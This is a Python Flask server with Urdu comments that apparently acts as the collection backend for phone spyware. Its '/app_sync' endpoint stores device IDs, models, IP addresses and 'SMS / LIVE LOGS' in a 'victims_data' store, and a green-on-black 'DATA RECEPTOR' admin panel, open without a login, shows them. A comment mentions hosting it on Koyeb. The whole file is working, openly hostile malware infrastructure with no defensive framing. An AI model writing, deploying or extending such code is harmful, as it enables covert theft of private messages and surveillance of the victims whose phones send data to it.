import os
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# تمام ڈیٹا یہاں محفوظ ہوگا (عارضی طور پر)
victims_data = {}

# ایڈمن پینل کا ڈیزائن (HTML/CSS)
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL - DATA RECEPTOR</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 20px; }
        .container { border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
        .device-card { border: 1px solid #333; margin-bottom: 20px; padding: 15px; background: #111; }
        .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
        .data-box { background: #000; color: #00ffcc; padding: 10px; height: 150px; overflow-y: scroll; border: 1px solid #222; white-space: pre-wrap; margin-top: 10px; }
        .tag { color: #ff0055; font-weight: bold; }
        .refresh-btn { background: #00ff00; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .refresh-btn:hover { background: #008800; }
    </style>
    <script>setTimeout(function(){ location.reload(); }, 15000);</script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🛰️ CLOUD DATA RECEPTOR v5.0</h2>
            <button class="refresh-btn" onclick="location.reload()">REFRESH SYSTEM</button>
        </div>
        
        <div id="content">
            {% if not victims %}
                <p style="text-align: center; color: #888;">> Waiting for incoming connections...</p>
            {% endif %}

            {% for dev_id, info in victims.items() %}
            <div class="device-card">
                <p><span class="tag">DEVICE ID:</span> {{ dev_id }} | <span class="tag">MODEL:</span> {{ info.model }}</p>
                <p><span class="tag">LAST SYNC:</span> {{ info.last_seen }} | <span class="tag">IP:</span> {{ info.ip }}</p>
                
                <strong>📩 SMS / LIVE LOGS:</strong>
                <div class="data-box">{{ info.logs }}</div>
                
                <p><span class="tag">STATUS:</span> <span style="color: #00ff00;">ONLINE (BACKGROUND)</span></p>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
"""

@app.route('/app_sync', methods=['POST'])
def receive_data():
    try:
        data = request.json
        # اگر ڈیٹا JSON نہیں ہے تو ایرر دے گا
        if not data:
            return jsonify({"status": "error", "message": "No JSON received"}), 400
        
        device_id = data.get("device_id", "UNKNOWN_DEV")
        model = data.get("model", "Unknown Model")
        content = data.get("all_data", "No content sent") # ایپ سے آنے والا اصل ڈیٹا
        
        # ڈیٹا کو ترتیب دینا
        victims_data[device_id] = {
            "model": model,
            "logs": content,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": request.remote_addr,
            "type": data.get("type", "SYNC")
        }
        
        print(f"[+] Data received from {device_id}")
        return jsonify({"status": "success", "received": True}), 200
    
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/admin_panel')
def admin_panel():
    return render_template_string(ADMIN_HTML, victims=victims_data)

if __name__ == '__main__':
    # Koyeb کے لیے پورٹ سیٹ اپ
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
